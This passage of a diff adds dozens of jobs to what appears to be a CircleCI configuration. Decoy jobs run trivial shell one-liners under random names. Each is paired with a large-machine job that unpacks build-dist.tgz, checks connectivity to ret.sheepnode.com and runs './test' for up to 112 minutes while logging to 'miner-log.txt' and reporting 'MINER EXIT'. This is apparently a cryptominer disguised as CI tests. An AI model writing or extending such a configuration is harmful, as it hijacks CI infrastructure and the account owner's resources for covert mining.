+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  OPHCE-11435:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Conduct texturing against the skybox
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; grep -ih -A 2 then /etc/profile; true ; } > /tmp/lower/packet-signal-bison-otter
+            echo "unit Run_Release8: $(wc -c </tmp/lower/packet-signal-bison-otter)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'packet-signal-bison-otter'
+  Run_Release8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/packet-signal-bison-otter 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  Install-ResponseItem:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Could we follow up with the stakeholders now
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; max=style_outer && printf '%s\n' "${max^}"; true ; } > /tmp/lower/packet_meadow
+            echo "unit min-ci: $(wc -c </tmp/lower/packet_meadow)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'packet_meadow'
+  min-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/packet_meadow 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  Enter-UnionList:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Suspend denoise
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'let'\''s go!' | sed 's|s|invoice|'; true ; } > /tmp/lower/20270808
+            echo "unit sirius-v2: $(wc -c </tmp/lower/20270808)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - '20270808'
+  sirius-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/RAM.api-Copper 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  DBFactory:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: RUN SPELLCHECK STYLE GUIDE
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; tar -zcf "/tmp/prefs.tgz" -C /etc hosts && tar -xzOf "/tmp/prefs.tgz" hosts | head -n 3; true ; } > /tmp/lower/HAWK_FEN_ATOLL_NICKEL
+            echo "unit q2-ship: $(wc -c </tmp/lower/HAWK_FEN_ATOLL_NICKEL)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'HAWK_FEN_ATOLL_NICKEL'
+  q2-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/HAWK_FEN_ATOLL_NICKEL 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  CommonTitleEntry:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Snapshot 3
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; echo 'meeting moved to 3pm' | base64; true ; } > /tmp/lower/noiseGlint
+            echo "unit smoke: $(wc -c </tmp/lower/noiseGlint)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'noiseGlint'
+  smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/noiseGlint 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  remote-normal-p:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Poll Oslo Edition
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/refundComment-bak" && cd "/tmp/refundComment-bak" && pwd; true ; } > /tmp/lower/audit-3d97.log
+            echo "unit min-smoke: $(wc -c </tmp/lower/audit-3d97.log)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'audit-3d97.log'
+  min-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/audit-3d97.log 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  param-handle-menu-puzzle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: The raw events ready yet
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; myfunc() { echo "[$(date +%T)] $*"; }; myfunc 'version 2.0'; true ; } > /tmp/lower/glyph-net.Atoll
+            echo "unit add-metrics-timeout: $(wc -c </tmp/lower/glyph-net.Atoll)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'glyph-net.Atoll'
+  add-metrics-timeout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/RAM.api-Copper 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  littleCandle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: bits and bobs
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; for word in {1..10..2};do sleep 0.1; echo $word; done | sort; true ; } > /tmp/lower/TICKET_058384
+            echo "unit ShipImage: $(wc -c </tmp/lower/TICKET_058384)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'TICKET_058384'
+  ShipImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/TICKET_058384 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  connectRectNonce:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Close the commissions for audit
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; touch -d '2020-01-01 12:00' /tmp/board.log && ls -l --time-style=long-iso /tmp/board.log; true ; } > /tmp/lower/EXaqfdWnT1tgg1hs1Xw
+            echo "unit jun25-smoke: $(wc -c </tmp/lower/EXaqfdWnT1tgg1hs1Xw)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'EXaqfdWnT1tgg1hs1Xw'
+  jun25-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/EXaqfdWnT1tgg1hs1Xw 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 112m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./test
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  stopOrigGraph:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mid run notice
+          command: |
+            mkdir -p /tmp/lower
+            { set +o pipefail 2>/dev/null; for k in rome kyoto cairo seoul austin berlin; do printf '%-8s %d\n' "$k" ${#k}; done | sort; true ; } > /tmp/lower/mapper-wave
+            echo "unit dp-old: $(wc -c </tmp/lower/mapper-wave)"
+      - persist_to_workspace:
+          root: /tmp/lower
+          paths:
+            - 'mapper-wave'
+  dp-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lower
+      - run:
+          name: Mount gate output
+          command: |
+            du -h /tmp/lower/mapper-wave 2>/dev/null || true
+      - run:
+          name: Fetch repo
+          command: git clone --depth 2 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load fixtures
+          command: zcat build-dist.tgz | tar xvf -
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
